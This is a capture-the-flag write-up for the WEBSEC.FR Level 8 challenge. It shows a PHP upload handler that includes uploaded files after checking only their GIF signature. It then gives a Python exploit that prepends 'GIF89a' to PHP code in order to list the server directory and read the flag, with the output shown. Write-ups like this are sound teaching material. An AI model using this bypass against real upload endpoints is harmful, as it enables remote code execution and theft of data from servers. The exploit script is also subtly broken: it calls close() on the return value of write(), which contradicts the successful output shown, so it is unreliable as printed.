# WEBSEC.FR Level8

### Main code

```php
<?php
$uploadedFile = sprintf('%1$s/%2$s', '/uploads', sha1($_FILES['fileToUpload']['name']) . '.gif');

if (file_exists($uploadedFile))
{
    unlink($uploadedFile);
}

if ($_FILES['fileToUpload']['size'] <= 50000)
{
    if (getimagesize($_FILES['fileToUpload']['tmp_name']) !== false)
    {
        if (exif_imagetype($_FILES['fileToUpload']['tmp_name']) === IMAGETYPE_GIF)
        {
            move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $uploadedFile);
            echo '<p class="lead">Dump of <a href="/level08' . $uploadedFile . '">' . htmlentities($_FILES['fileToUpload']['name']) . '</a>:</p>';
            echo '<pre>';
            include_once ($uploadedFile);
            echo '</pre>';
            unlink($uploadedFile);
        }
        else
        {
            echo '<p class="text-danger">The file is not a GIF</p>';
        }
    }
    else
    {
        echo '<p class="text-danger">The file is not an image</p>';
    }
}
else
{
    echo '<p class="text-danger">The file is too big</p>';
}
?>

```



**Bypass `getimagesize()` & `exif_imagetype`**

Add `.gif` header to php file

=> `\x47\x49\x46\x38\x39\x61`(GIF89a)



### Exploit

```python
import requests as req
import re



FNAME = "shell.php"
gifhead=b"\x47\x49\x46\x38\x39\x61"#GIF89a
php_ls = b"<?php $ls = scandir('./'); print_r($ls);  echo 'END'; ?>"
php_flag = b"<?php echo file_get_contents('flag.txt'); ?>"


def upload(code):
    f = open(FNAME,"wb")
    f.write(gifhead+code).close()
    url = "http://websec.fr/level08/index.php"
    file = {"fileToUpload":open("shell.php",'rb')}
    res = req.post(url,files=file)
    result = re.findall("<pre>(.*?)</pre>",res.text.replace("\n"," "))
    return result[0]

print(upload(php_ls))
print(upload(php_flag))


#OUTPUT
"""
GIF89acbArray (     [0] => .     [1] => ..     [2] => flag.txt     [3] => index.php     [4] => php-fpm.sock     [5] => source.php     [6] => uploads ) END
GIF89acb WEBSEC{BypassingImageChecksToRCE} 
"""
```

